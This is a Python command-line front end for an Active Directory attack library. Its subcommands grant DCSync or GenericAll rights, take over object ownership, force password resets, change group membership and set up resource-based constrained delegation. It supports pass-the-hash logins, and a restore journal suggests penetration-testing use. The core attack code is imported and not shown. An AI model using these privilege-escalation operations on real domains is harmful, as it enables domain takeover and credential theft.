#!/usr/bin/env python3
"""adpwn_cli.py -- standalone CLI for adpwn-tools.

Usage:
  python adpwn_cli.py dcsync --host 10.10.11.100 --domain corp.local --user lowpriv --password Password123 --trustee lowpriv
  python adpwn_cli.py restore --host 10.10.11.100 --domain corp.local --user lowpriv --password Password123 --file /tmp/adpwn-2026.restore
"""
import argparse
import asyncio
import sys
from adpwn_tools import (
    adpwn_add_generic_all,
    adpwn_add_dcsync,
    adpwn_add_group_member,
    adpwn_remove_group_member,
    adpwn_set_owner,
    adpwn_set_password,
    adpwn_add_rbcd,
    adpwn_add_addmember_priv,
    adpwn_restore_journal,
)


def common_args(p):
    p.add_argument("--host", required=True, help="DC IP or hostname")
    p.add_argument("--domain", required=True, help="FQDN (e.g. corp.local)")
    p.add_argument("--user", required=True, help="Authenticating username")
    p.add_argument("--password", default="", help="Password (omit for PtH)")
    p.add_argument("--nthash", default="", help="NT hash -- bare NT or LM:NT format")
    return p


def print_result(r):
    print(r["summary"])
    if r.get("restore_file"):
        print("[restore] " + r["restore_file"])
    if r.get("findings"):
        for finding in r["findings"]:
            print("  " + finding)
    if not r.get("success"):
        print("[!] Operation reported failure. raw_output:")
        print(r.get("raw_output", ""))
        sys.exit(1)


def build_parser():
    parser = argparse.ArgumentParser(
        prog="adpwn_cli.py",
        description="adpwn-tools CLI -- AD ACL abuse primitives",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    p = sub.add_parser("generic-all", help="Grant GenericAll on any AD object (WriteDacl)")
    common_args(p)
    p.add_argument("--target", required=True, help="Target object (DN or sAMAccountName)")
    p.add_argument("--trustee", required=True, help="Principal to grant rights to")

    p = sub.add_parser("dcsync", help="Grant DCSync rights on the domain root")
    common_args(p)
    p.add_argument("--trustee", required=True, help="Principal to grant DCSync to")

    p = sub.add_parser("add-member", help="Add a principal to a group (WriteProperty)")
    common_args(p)
    p.add_argument("--group", required=True, help="Target group")
    p.add_argument("--member", required=True, help="Principal to add")

    p = sub.add_parser("remove-member", help="Remove a principal from a group")
    common_args(p)
    p.add_argument("--group", required=True, help="Target group")
    p.add_argument("--member", required=True, help="Principal to remove")

    p = sub.add_parser("set-owner", help="Transfer ownership of an AD object (WriteOwner)")
    common_args(p)
    p.add_argument("--target", required=True, help="Target object")
    p.add_argument("--new-owner", required=True, dest="new_owner", help="New owner principal")

    p = sub.add_parser("set-password", help="Force-reset a user password (ForceChangePassword)")
    common_args(p)
    p.add_argument("--target", required=True, help="Target user")
    p.add_argument("--new-password", required=True, dest="new_password", help="New password to set")

    p = sub.add_parser("rbcd", help="Configure RBCD on a computer object")
    common_args(p)
    p.add_argument("--target", required=True, help="Victim computer (e.g. VICTIM$)")
    p.add_argument("--trustee", required=True, help="Attacker computer to delegate to (e.g. ATTACKER$)")

    p = sub.add_parser("addmember-priv", help="Grant AddMember right to trustee over a group (WriteDacl)")
    common_args(p)
    p.add_argument("--target", required=True, help="Target group")
    p.add_argument("--trustee", required=True, help="Principal to grant right to")

    p = sub.add_parser("restore", help="Replay restore journal -- undo all recorded LDAP changes")
    common_args(p)
    p.add_argument("--file", required=True, dest="restore_file", help="Path to .restore journal file")

    return parser


async def run(args):
    kw = dict(
        host=args.host,
        domain=args.domain,
        username=args.user,
        password=args.password,
        nthash=args.nthash,
    )
    c = args.command
    if c == "generic-all":
        return await adpwn_add_generic_all(**kw, target=args.target, trustee=args.trustee)
    elif c == "dcsync":
        return await adpwn_add_dcsync(**kw, trustee=args.trustee)
    elif c == "add-member":
        return await adpwn_add_group_member(**kw, group=args.group, member=args.member)
    elif c == "remove-member":
        return await adpwn_remove_group_member(**kw, group=args.group, member=args.member)
    elif c == "set-owner":
        return await adpwn_set_owner(**kw, target=args.target, new_owner=args.new_owner)
    elif c == "set-password":
        return await adpwn_set_password(**kw, target=args.target, new_password=args.new_password)
    elif c == "rbcd":
        return await adpwn_add_rbcd(**kw, target=args.target, trustee=args.trustee)
    elif c == "addmember-priv":
        return await adpwn_add_addmember_priv(**kw, target=args.target, trustee=args.trustee)
    elif c == "restore":
        return await adpwn_restore_journal(**kw, restore_file=args.restore_file)


def main():
    parser = build_parser()
    args = parser.parse_args()
    result = asyncio.run(run(args))
    print_result(result)


if __name__ == "__main__":
    main()
